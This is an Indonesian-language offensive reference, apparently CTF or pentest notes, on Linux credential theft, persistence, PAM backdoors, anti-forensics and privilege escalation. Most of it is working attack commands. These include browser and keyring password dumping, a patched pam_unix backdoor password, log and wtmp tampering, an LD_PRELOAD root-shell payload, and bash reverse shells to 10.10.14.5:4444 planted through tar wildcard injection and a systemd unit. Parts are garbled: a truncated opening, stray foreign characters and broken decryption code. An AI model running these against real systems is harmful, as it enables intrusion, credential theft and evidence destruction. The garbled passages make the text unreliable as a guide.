
5. **PAM-callback log/jobs and shutdown**: setiap `pam_exec.so` callout ternyata diteruskan via `logind` juga pada `reboot` — jika payload tapi masih perlu `reboot` (drop semua komitmen variabel `INIT` masuk

## 12.7 Varian Teknik per Versi/Distribusi

| Teknik | Perbedaan antar sistem | Catatan operasional |
|---|---|---|
| Format `/etc/shadow` | Debian: `$y$` (yescrypt, sejak Debian 11), RHEL 9: `*$6*` default→yescrypt juga, Ubuntu 22.04+: yescrypt | John/hashcat mode: `500` (MD5), `1800` (SHA-512), `yescrypt` = hashcat mode 19000 (atau use `--format=crypt` di John). Format `$y$` lamajohn salah parsing — gunakan john ≥ 1.9.0 jumbo |
| `chage -d 0` vs `passwd -e` | Sama efek; busybox tidak punya `chage` | Reset `lastchg` field di `/etc/shadow` field ke-3 → `0` |
| systemd timer vs cron | Cron absen di banyak container/raspbian minimal; timer selalu ada jika systemd init | Persistence timer lebih stealthy: unit file di `~/.config/systemd/user/` tanpa root |
| PAM module location | Debian/Ubuntu: `/lib/x86_64-linux-gnu/security/`, RHEL: `/lib64/security/`, Alpine: `/lib/security/` | Kompilasi `pam_unix.so` backdoor harus link ke `-lpam -lcrypt` versi distro target — binary Debian sering crash di RHEL (glibc vs compatible issue minor) |
| `LD_PRELOAD` + `sudo` | `sudo` strip `LD_PRELOAD` (env_reset) kecuali `env_keep` permite | Gunakan `sudo` whitelist check: `sudo -l` → jika `env_keep+=LD_PRELOAD`, ini privesc langsung |
| Yescrypt parameter | `$y$j9T$` — parameter `j9T` = cost | Naikkan cost untuk slow down audit (evil), atau identifikasi valid hash via `$y$` prefix |

## 12.8 Keyring & Desktop Credential Sources (Lanjutan)

```bash
# GNOME keyring — dump via python without prompt if unlocked session
python3 -c "import keyring; print(keyring.get_keyring())"
ls -la ~/.local/share/keyrings/          # file login.keyring (binary, password-hashed AES)
# keyrings/decrypt via "pypykdump" or jh00/brg keyring tools; john format: "keyring"

# Seahorse GUI access (if X session reachable)
DISPLAY=:0 seahorse                      # klik untuk melihat stored password

# KDE Wallet
ls ~/.local/share/kwalletd/
kwallet-query -l kdewallet -f Passwords

# Firefox / Chrome store (linux)
find ~/.mozilla -name "logins.json" -o -name "key4.db"
find ~/.config/google-chrome -name "Login Data"       # SQLite; password di kolom encrypted_value (AES-256-GCM key di Local State, didekripsi via DPAPI? NO — di Linux Chrome pakai hard-coded key di `os_crypt`: literal "peanuts" (v80) atau v11 salt key)
python3 - <<'EOF'
# Chrome Linux decryption (pre-v80 "peanuts", v80+ PBKDF2 "saltysalt")
from Crypto.Cipher import AES
import json,base64,sqlite3
key=json.load(open('~/.config/google-chrome/Local State'.replace('~',__import__('os').path.expanduser('~')))
EOF
```

Edge case terbaru (Chrome v117+): kunci `app_bound_encryption` mulai diterapkan di Linux — os_crypt key v20 (AEAD-Aes256Gcm) di-encrypt dengan key yang dirilis via `os_crypt::` keyring integration; dump alternatif: `secretstorage` D-Bus `libsecret`:

```bash
busctl --user call org.freedesktop.secrets /org/freedesktop/secrets/aliases/default \
  org.freedesktop.Secret.Collection GetAll s
# atau: secret-tool search --all xdg:schema chrome_libsecret_os_crypt_password_v2
```

Jebakan: jika Browser Chrome **masih running**, DB SQLite di-lock (WAL mode) → copy dulu: `cp Login\{,\ Data\}` (escape spasi), atau `sqlite3 'file:Login Data?immutable=1'`.

## 12.9 /proc/kore & Memory Analysis (Lanjutan)

- `/proc/kcore` ELF core dump (biasanya 128TB) — biasanya 0400 root only, tapi masih bisa dibaca dengan `dd if=/proc/kcore` **hanya jika CAP_SYS_RAWIO** — jebakan umum di container: file **tidak ada** (`/proc/kcore` absen dengan `lxcfs` atau proc-hidepid).
- Grep memory untuk password strings via `strings /proc/<pid>/maps + /proc/<pid>/mem` — lebih praktis dari kcore:
```bash
grep -a -i 'passw\|BEGIN RSA\|BEGIN OPENSSH' /proc/*/maps  # pointer ke slave page
dd if=/proc/$PID/mem bs=4096 skip=$OFFSET count=1 2>/dev/null | strings
```
- Heap CLI: `gcore $PID` (dari gdb) → offline strings/mimikatz-equivalent `debugfs` technique.

## 12.10 Lateral Movement — SSH ControlMaster (Detail Tambahan)

```bash
# Pastikan config target membolehkan ControlMaster (Req: present di /etc/ssh/sshd_config? — NO, ini client-side)
# Host-based auth sering dimatikan; tapi multiplex connection **bypass AgentForwarding restriction**
ssh -o ControlMaster=auto -o ControlPath=/tmp/%r@%h:%p -o ControlPersist=600 user@victim
# Setelah control socket hidup, semua proses dengan path ini **persistence jangka pendek** walaupun user logout
# Hijack: bila socket tidak chmod 600, user lain bisa koneksi lewat socket (tmp)

# ControlPersist long-lived = semi-persistence tanpa root:
ssh -O forward -S /tmp/%r@%h:%p user@victim    # dynamic local port forward regen
```

**Jebakan**: `SecurityKey`/FIDO2 keys (`sk-ecdsa-sha2-nistp256@openssh.com`) tidak bisa dipakai ulang via agent forwarding — private key handle single-shot per-host; hanya bisa agent hijack jika masih ada `SSH_SK_PROVIDER` callable. Untuk OpenSSH ≥ 8.9, agent forwarding via `SSH_AUTH_SOCK` melalui systemd per-user socket sering diset env cleaner — check `systemctl --user show-environment`.

## 12.11 Persistence — Landing Spots Tambahan

| File mekanisme | Jalur | Trigger context | Stealth |
|---|---|---|---|
| Systemd generator | `/etc/systemd/system-generators/*.sh` — executable apapun, dipanggil oleh systemd-generators saat boot **sebagai root, sebelum systemd parses** units | paling stealth, jarang diaudit |
| udev rules | `/etc/udev/rules.d/*` + `RUN{...}` | tiap device hotplug/kernel action |
| Initramfs hook (Debian) | `/etc/initramfs-tools/scripts/*` | pre-boot, fs belum ro-mount → bagus untuk tahan rebuilding |
| ld.so.preload | `/etc/ld.so.preload` — setara LD_PRELOAD **global, semua binary setuid pun kena** (asal lib tidak `dlopen`-gateway) | stealthy — trik: host `chmod` modifikasi untuk kembali-stamp mtime /etc/ld.so.preload |
| Kernel module | `/etc/modules-load.d/` | modul *.ko persistent; jejak `lsmem` visible — pakai `modprobe -r` di syslog purge |
| motd / profile snippets | `/etc/profile.d/*.sh`, `~/.bash_login`, `~/.zshenv` (zsh — **juga trigger non-interactive!** bash TIDAK) | tradisional tapi sangat cepat menyebar ke jihad `scp ~/.bashrc` |
| apt hook | `/etc/apt/apt.conf.d/99x { "APT::Update::Post-Invoke {"..."};}` | tiap apt update, SUID-of-root default |
| git hooks | `~/.gitconfig core.hooksPath`, `~/.config/git/hooks/` (Git ≥ 2.9+, global hooks working) | trigger saat user legit menjalankan git pull — LOLM |

**Pitfall operasional udev/PAM/systemd**: proses daemon tidak memuat `~/.bashrc` — jangan sematkan payload di variabel shell-only jika wilayah non-login (sshd PAM session) yang dilalui.

## 12.12 PAM Backdoor — Sidik Jari & Anti-Restorable

- Rootkit `pam_unix.so` patch: face-lift `retval = _unix_verify_password(...); if (strcmp(pw=="WdawWdw")) retval=PAM_SUCCESS;` — build dengan **versi PAM yang sama** target (`linux-pam` source di distro `apt source pam`).
- Verifikasi: `pamtester sshd user authenticate` untuk testing CLI. `strings pam_unix.so | grep -v` original compare untuk deteksi (defenders).
- Pitfall: replace file → mtime dan inode berubah; check hash snapshot `debsums -s pam` (Debian) / `rpm -Va pam` akan flag mismatch — praktis host ulang di harga management atau `ar p` + `dpkg --verify` purge method: rewrite via `stap` (systemtap) live-patch di memori untuk menghindari file diff:
```bash
# Stap live-match: stap -g 'probe process("/lib/*/pam_unix.so").function("_unix_verify_password") { if ($pw == "x") $retval=0 }'
```
- Timeout/lockout pam_tally2/tally: `pam_faillock` (RHEL 8+) vs `pam_tally2` (Ubuntu 20.04 masih, dideprecated Ubuntu 22) — backdoor password harus dievaluasi sebelum `pam_faillock`, atau account lockout terjadi dan memicu alert.

## 12.13 Anti-forensics — Sign-off sebelum Logout

```bash
# Timestamp restore pivot (jangan touch hanya via touch — backup timestamps dulu saat masuk)
find /var/log/ -newer /root/.bashrc | xargs stat -c '%n %Y %Z' > /tmp/t.s # pre-record

# Timestomp one file:
touch -r /etc/passwd /etc/ld.so.preload            # klon mtime+atime
# CTIME tidak bisa diubah — notable interviewer trap; ctime hanya via lang manipulation (libfaketime LD_PRELOAD saat penulisan, atau via debugfs patch jika offline)

# Stealth-check tools deployment log (::file_stash)
find /[lowercase dirs] -xdev -inum $INODE                         # hardlink safe
```

Jejak yang sering kelupaan:
`/var/log/auth.log` (auditd: `ausearch -m USER_AUTH` di RHEL), `/var/log/wtmp`, `last`/`lastb` cleanup (`utmpdump -r /var/log/wtmp > tmp.txt`+remove, sed out, `utmpdump -w`) — biarkan **sesi legit tetap**, delete hanya baris sendiri untuk menghadapi diff-backup (enterprise). `journalctl --vacuum-time=1s` menghapus semua (ke-terdeteksi), `journalctl --rotate` + edit `*.journal~` offline lebih halus.

AI/telemetri modern: EDR Linux (Wazuh/Sentinelone/Auditbeat) menulis via auditd ke disk **dilokal tapi infrequent remote** — deteksi: `ls -l /etc/audit/plugins.d/`, `/etc/audit/audit.rules*` untuk spesifik siapa yang listening (audisp-remote). Anti hanya via one-shot cleanup di stage final, bukan menonaktifkan service (jebakan: `systemctl stop auditd` sendiri log'd immutable, berpotensi perlu `service auditd stop` alternatif — lebih jarang berhasi di systemd terrain dua-duanya logged)


## privesc-linux

# privesc-linux — linux

# Bab 5: Linux Privilege Escalation — Referensi Teknis

## 5.1 SUID/SGID Abuse

**Konsep:** Binary dengan bit SUID dieksekusi dengan eUID pemilik file (biasanya root). SGID sama tapi untuk group.

### Pencarian

```bash
find / -perm -4000 -type f 2>/dev/null        # SUID
find / -perm -2000 -type f 2>/dev/null        # SGID
find / -perm -6000 -type f 2>/dev/null        # keduanya
find / -perm -4000 -exec ls -la {} \; 2>/dev/null
```

### Shortcut GTFOBins (yang paling sering muncul di box)

| Binary | Payload | Kondisi |
|---|---|---|
| `find` (SUID) | `find . -exec /bin/sh -p \;` atau `find / -user root -perm -4000 -exec /bin/sh -p \;` | `find` harus SUID |
| `vim` (SUID) | `vim -c ':!sh -p'` atau `:set shell=/bin/sh` | interactive |
| `env` / `awk` / `sed` | `awk 'BEGIN {system("/bin/sh -p")}'` | `-p` penting agar shell tidak drop eUID |
| `bash` (SUID) | `bash -p` | harus dikompilasi tanpa `-DISABLE_SUID` pada kernel modern sudah dihalangi |
| `cp` (SUID) | copy /etc/passwd, append user hash root | copy dari writable dir |
| `less` | `!/bin/sh` saat paging file root |
| `python` SUID | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `pkexec` (SUID) | CVE-2021-4034 → lihat 5.9 |

**Kenapa `-p`:** shell modern (bash/dash) drop eUID ke rUID real user kecuali diberi flag privileged. Tanpa `-p`, eUID=root tapi rUID=user → prompt `whoami` tetap user. Interpretasi `id` vs `id -u`: keduanya beda konteks, selalu cek `id` (euid vs uid muncul di real/effective).

**SGID spesifik:** musik `SGID` pada `ssh-agent` → attach socket + inject key. Atau SGID group menarik: cek `getent group | grep -i <gid binary>`.

### Ceg base64 backdooring SUID file baru
Linux mount option `nosuid` di `/tmp`, `/home` (umum di distro modern) → SUID copy Anda diam-diam tidak dieksekusi sebagai root. Cek:
```bash
mount | grep -E "noexec|nosuid"
findmnt -no OPTIONS /tmp
```

### SUID custom binary (bukan GTFOBins)
```bash
strings /usr/local/bin/suid_helper | grep -Ei "system|exec|popen|/bin"
strace /usr/local/bin/suid_helper 2>&1 | grep -Ei "execve|clone"
```
Kalau dia panggil binary tanpa full path (mis. `system("menu")`) → PATH hijack (5.5).

---

## 5.2 Capabilities

**Konsep:** fine-grained privileges tanpa full SUID. Cukup satu capability bisa jadi privesc.

```bash
getcap -r / 2>/dev/null
# atau cepat
find / -xdev -type f -exec getcap {} \; 2>/dev/null
```

| Cap set | Payload |
|---|---|
| `cap_setuid=ep` pada `python3` | `python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh")'` |
| `cap_dac_read_search=ep` pada `tar` | `tar cf backup.tar /etc/shadow` → ambil hash root |
| `cap_net_raw=ep` | sniffer credential, ARP spoof di shared L2 |
| `cap_net_bind_service` | bind port 80/443 (bukan langsung root, tapi pivot untuk service misbelief) |
| `cap_sys_ptrace=ep` | inject shellcode ke proses root yang berjalan (`gdb -p`, atau CFFI) |
| `cap_sys_admin` pada binary apa pun | hampir setara root: mount, `unshare`, docker socket |

**Point penting:**
- Capabilities pada *interpreter* (python, perl, node) = game over instan.
- `=ep` artinya effective+permitted. `=p` saja tidak cukup (harus raise dulu via `capset`, tidak berguna kalau binary tidak aware).
- Pada kernel ≥ 5.8, file caps di interupsi oleh ambient caps — jangan berharap cap muncul di subshell.

## 5.3 Sudo Misconfiguration

### Enumerasi
```bash
sudo -l
cat /etc/sudoers 2>/dev/null
ls -la /etc/sudoers.d/
```

### NOPASSWD
```
luser ALL=(ALL) NOPASSWD: /usr/bin/vim
```
→ Cek GTFOBins kolom sudo. Contoh:
- `sudo less /etc/shadow`
- `sudo env /bin/sh`
- `sudo apache2 -f /etc/passwd` trigger
- `sudo find /dev/null -exec /bin/sh \;` (find + sudo ops)
- `sudo awk 'BEGIN{system("/bin/sh")}'`

### sudoedit (CVE-2021-3156 + sudoedit env)
- **CVE-2021-3156 Baron Samedit**: heap overflow di argumen `sudoedit -s '\'` backslash parsing. Dapat di versi **sudo 1.8.2–1.9.5p1** (patch di 1.9.5p2, Jan 2021).
```bash
sudoedit -s '\' $(python3 -c 'print("A"*65536)')
# kalau respons = "malloc(): invalid size" → vulnerable
```
- **sudoedit hijack EDITOR**: kalau `/etc/sudoers` mengizinkan `luser ALL=(root) sudoedit /etc/file`, tetapi sudo versi lama membaca shell env lebih agresif:
```
export EDITOR="vi --cmd 'set shell=/bin/sh'"
sudo -l  # konfirmasi sudoedit
echo 'user ALL=(root) NOPASSWD: SETENV:' ; export SUDO_EDITOR=...
```
- **sudo < 1.9.8 adalah kunci**: ENV override termasuk `SUDO_EDITOR`.

### LD_PRELOAD
Jika `sudo -l` menunjukkan `env_keep+=LD_PRELOAD` — adalah izin runtime loading. Tapi sebenarnya **kebanyakan modern sudo punya LD_PRELOAD yang dihapus** kecuali explicitly enabled.

**Payload** (compile di target):
```c
// preload.c
#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/sh -p");
}
```
```bash
gcc -shared -fPIC -nostartfiles -o /tmp/preload.so preload.c
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/any-allowed-bin
```

**Kenapa gagal**: sudoاجر default men-strip LD_PRELOAD kapan root di-spawn. Tidak ada `env_keep` berisi LD_PRELOAD → JANGAN buang waktu compile payload.

Kalau hanya `env_keep+=LD_LIBRARY_PATH` → compile shared lib dengan simbol yang dipakai binary target:
```bash
ldd /usr/sbin/allowed-binary    # cari lib custom, mis. /opt/lib/libapp.so
# buat libapp.so overwrite, drop ke $LD_LIBRARY_PATH
```

### env_keep lain
- `env_keep+=PYTHONPATH` → timpa `site.py`/modul internal python.
- `env_keep+=PATH` → PATH hijack via sudo (lihat 5.5).

## 5.4 Cron & Systemd Timer Writable

### Enumerasi
```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /var/spool/cron/crontabs/
systemctl list-timers --all
find /etc/systemd -name "*.timer" -o -name "*.service" | xargs ls -la

# binary yang dijalankan root — writable?
grep -E "Exec|Run" /etc/crontab /etc/cron.d/* 2>/dev/null
```

### Vektor: script cron writable oleh user
```
/etc/crontab: * * * * * root /usr/local/bin/backup.sh
```
```bash
ls -la /usr/local/bin/backup.sh     # -rwxrwxrwx? 
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> backup.sh
# tunggu ≤60 detik, lalu /tmp/rootbash -p
```

### Wildcard injection (cron tar)
```
*/5 * * * * root tar czf /backup.tgz /home/user/*.txt
```
```bash
# di /home/user
echo '' > --checkpoint=1
echo '' > --checkpoint-action=exec=sh /home/user/rev.sh
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' > rev.sh
chmod +x rev.sh
```
**Kenapa berhasil**: tar mem-parse filename sebagai argumen.
**Kenapa gagal**: cron job dengan quoted paths, atau cron abspath `cd` dulu.

### systemd timers
Path unit: `/etc/systemd/system/*timer`, check `OnCalendar=`. Timer service file `/etc/systemd/system/foo.service` writable:
```
[Service]
Type=oneshot
ExecStart=/bin/sh -c '/bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```
```bash
systemctl daemon-reload  # if sudo available, else wait for timer
```

**Cek library dependency suid:** custom daemon service dengan executable di `/opt` sering punya `LD_LIBRARY_PATH` atau wrapper mencari `.env` — grep `systemctl cat <svc>` untuk `ExecStart=` pointing to `/opt`.

## 5.5 PATH Hijack

**Kondisi:** script yang di-running dengan privilege (cron/SUID) memanggil binary tanpa absolute path:

```bash
strings /usr/local/bin/check.sh
# output: "ping", "curl", "ls"
```

**Payload:**
```bash
cd /tmp
echo 'cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' > curl
chmod +x curl
export PATH=/tmp:$PATH (untuk subshell yang mewarisi PATH)
# atau dengan writable /, sisipkan binary langsung
```

**kenapa gagal:** modern cron SUID binary reset `PATH` ke `secure_path` (akun root: `/usr/sbin:/usr/bin:...`). Script python exec juga — tetap `sudo -l` umumnya dikunci `secure_path`. PATH hijack pada task SUID **tergantung apakah binary set PATH sendiri**.

SUID binary menggunakan syscall `setuid(0)` explicit sebelum `system()` → PATH hijack works only jika env NOT sanitized. Strace-nya:

```bash
strace -f /usr/local/bin/suid_bin 2>&1 | grep execve
# output: execve("/bin/sh", ["sh", "-c", "curl http://..."], ... 
```
→ `sh -c "curl ..."` = win.

### PATH env_keep via sudo
```
sudo -l
Matching Defaults entries: env_reset, secure_path="/usr/bin:..."
```
Tidak ada secure_path → suid/default bisnis lain:
```bash
sudo PATH=/tmp:/usr/bin:/bin <allowed-binary>
```

---

## 5.6 NFS no_root_squash

**Check dari box target:**
```bash
cat /etc/exports | grep -i "no_root_squash\|rw"
# output: /share *(rw,no_root_squash)
```
- `no_root_squash` = UID 0 client mapped ke UID 0 server.

**Dari attacker box (Linux):**
```bash
mkdir /tmp/nfs
mount -t nfs 10.10.10.x:/share /tmp/nfs
cp /bin/bash /tmp/nfs/bash
chmod 4755 /tmp/nfs/bash
```
**Di target:**
```bash
/tmp/share/bash -p    # euid=0
```

**Kenapa gagal:** NFSv4 with Kerberos/`sec=krb5p`, server mengaktifkan `root_squash` default modern distro, client mount pada Windows tidak set SUID by default (`mount -o suid` perlu). NFSv4 umumnya masih transfer — jangan masalah.

**Alternatif (squashed):** `no_all_squash` + ambil UID user lain yang punya file di share (`showmount -e`, lalu manual chown dengan spoofed UID client-side root).

---

## 5.7 Docker / LXD Group

### Docker
```bash
id | grep -E "docker|lxd"
docker ps 2>&1
```
Anggota group `docker` = root de facto.
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# atau binary-less:
docker run -v /:/host -d alpine sleep 300
docker exec -it <id> chroot /host sh
```
**Dind (docker-in-docker) tidak hadir** → fallback: `docker socket di /var/run/docker.sock` writable:
```bash
curl --unix-socket /var/run/docker.sock -X POST ...
```
Atau image yang host volume: `docker run -v /:/host --privileged`.

**Docker tanpa daemon image:** sym-link `/etc/passwd` di volume shared.

### LXD/LXC
```bash
lxd init --auto 2>&1   # kalau group lxd member
# di attacker box: build lxc image
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine   # output: alpine-image.tar.gz
lxc image import ./alpine*.tar.gz --alias privesc
lxc init privesc privesc -c security.privileged=true
lxc config device add privesc mydev disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```
Di container → host FS di `/mnt/root`. Set `/etc/passwd` atau copy ssh key.

**Versi:** Ubuntu 14.04/latest, LXD pre-5.0 deploy script deprecated sejak **LXD 5.0 LTS (2022)** — script build tetap berfungsi di kebanyakan box CTF.
